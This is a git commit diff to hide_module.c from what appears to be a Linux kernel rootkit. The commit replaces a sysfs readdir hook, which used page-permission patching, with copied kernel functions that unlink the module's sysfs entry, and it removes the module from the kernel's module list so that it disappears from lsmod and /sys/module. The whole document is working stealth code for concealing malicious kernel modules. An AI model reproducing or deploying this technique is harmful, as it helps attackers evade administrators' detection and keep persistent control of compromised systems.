9e9d5956d3aba58f7c4a018bad3cbaec3fba96bd
Roman Karlstetter <roman@rm-karlstetter.de>
2012-02-04 16:51:48 +0100

    use copied functions for module hiding

--- hide_module.c
+++ hide_module.c
@@ -7,39 +7,7 @@
 #include "global.h"
 #include "hide_module.h"
 
-
-/// sysfs stuff
-typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
-fun_int_file_dirent_filldir_t original_sysfs_readdir;
-filldir_t original_sysfs_filldir;
-
-struct sysfs_dirent *this_module_dirent;
-
-int hidden = 0;
-
-int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
-    if (strcmp(name, THIS_MODULE->name) == 0){
-        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
-        return 0;
-    }
-    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
-}
-
-int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
-    OUR_DEBUG("Hooked sysfs_readdir.\n");
-    original_sysfs_filldir = filldir;
-    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
-}
-
-
-void hook_sysfs(void){
-    struct file_operations* sysfs_dir_ops;
-    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
-    original_sysfs_readdir = sysfs_dir_ops->readdir;
-    make_page_writable((long unsigned int) sysfs_dir_ops);
-    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
-    make_page_readonly((long unsigned int) sysfs_dir_ops);
-}
+static int hidden = 0;
 
 
 /**
@@ -91,88 +59,69 @@ struct sysfs_dirent {
         struct sysfs_inode_attrs *s_iattr;
 };
 
-void remove_from_sysfs_list(void){
-    struct module *mod = THIS_MODULE;
-    struct sysfs_dirent *entry, *parent, *last;
-    int count;
-    // Get internal file descriptor of the module directory of sysfs
-    entry = mod->mkobj.kobj.sd;
-    parent = entry->s_parent;
+static void sysfs_unlink_sibling(struct sysfs_dirent *sd)
+{
+        struct sysfs_dirent **pos;
 
-    last = 0;
-    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
-    {
-        if(strcmp(entry->s_name, THIS_MODULE->name) == 0){
-            this_module_dirent = entry;
-            if(last == 0){
-                parent->s_dir.children = entry->s_sibling;
-            } else {
-                last->s_sibling = entry->s_sibling;
-            }
-            break;
+        for (pos = &sd->s_parent->s_dir.children; *pos;
+             pos = &(*pos)->s_sibling) {
+                if (*pos == sd) {
+                        *pos = sd->s_sibling;
+                        sd->s_sibling = NULL;
+                        break;
+                }
         }
-        last = entry;
-        //OUR_DEBUG("name: %s", entry->s_name);
-    }
+}
 
-    count = 0;
-    // Loop over all modules and count
-    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
-    {
-        count++;
-    }
-    OUR_DEBUG("count: %d", count);
+void remove_from_sysfs_list(void){
+    sysfs_unlink_sibling(THIS_MODULE->mkobj.kobj.sd);
+}
+
+void sysfs_link_sibling(struct sysfs_dirent *sd)
+{
+        struct sysfs_dirent *parent_sd = sd->s_parent;
+        struct sysfs_dirent **pos;
+
+        BUG_ON(sd->s_sibling);
+
+        /* Store directory entries in order by ino.  This allows
+         * readdir to properly restart without having to add a
+         * cursor into the s_dir.children list.
+         */
+        for (pos = &parent_sd->s_dir.children; *pos; pos = &(*pos)->s_sibling) {
+                if (sd->s_ino < (*pos)->s_ino)
+                        break;
+        }
+        sd->s_sibling = *pos;
+        *pos = sd;
 }
 
 void reinsert_to_sysfs_list(void){
-    struct sysfs_dirent *parent, *entry;
-    int count;
-
-    parent = this_module_dirent->s_parent;
-    this_module_dirent->s_sibling = parent->s_dir.children;
-    parent->s_dir.children = this_module_dirent;
-
-    count = 0;
-    // Loop over all modules and count
-    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
-    {
-        count++;
-    }
-    OUR_DEBUG("count: %d", count);
+    sysfs_link_sibling(THIS_MODULE->mkobj.kobj.sd);
 }
 
-
-void unhook_sysfs(void){
-    struct file_operations* sysfs_dir_ops;
-    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
-    make_page_writable((long unsigned int) sysfs_dir_ops);
-    sysfs_dir_ops->readdir = original_sysfs_readdir;
-    make_page_readonly((long unsigned int) sysfs_dir_ops);
-}
 
 /*
  * Hiding a module is basically just removing it from the list of modules
  */
 void hide_module(void)
 {
-    remove_from_sysfs_list();
     if(hidden == 1)
         return;
     list_del(&(THIS_MODULE->list));
+    remove_from_sysfs_list();
 
     hidden = 1;
-    hook_sysfs();
 }
 
 
 void unhide_module(void)
 {
-    reinsert_to_sysfs_list();
     if(hidden == 0)
         return;
 
     list_add(&(THIS_MODULE->list), (struct list_head *) ptr_modules);
+    reinsert_to_sysfs_list();
 
     hidden = 0;
-    unhook_sysfs();
 }
